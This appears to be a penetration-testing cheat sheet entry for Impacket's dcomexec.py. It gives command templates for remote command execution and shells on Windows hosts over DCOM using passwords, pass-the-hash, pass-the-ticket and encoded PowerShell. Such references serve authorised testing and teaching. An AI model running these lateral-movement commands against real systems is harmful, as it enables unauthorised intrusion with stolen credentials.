# dcomexec.py (imp)

% windows, impacket-exec, dcom

#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  

## desc
```
Execute a command or semi interactive shell without touching the disk or running a new service using DCOM
In case the TCP port 445 is not available, we can use the option -no-output.
```

## execute (creds)
```bash
dcomexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn> <cmd|>
```

## execute powershell encoded (creds)
```bash
dcomexec.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn> "powershell -e <powershell_encoded|>"
```

## execute (pth)
```bash
dcomexec.py -debug -shell-type powershell -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn> <cmd|>
```

## execute (ptt)
```bash
KRB5CCNAME=<ccache> dcomexec.py -debug -shell-type powershell -no-pass -k <target_fqdn> <cmd|>
```
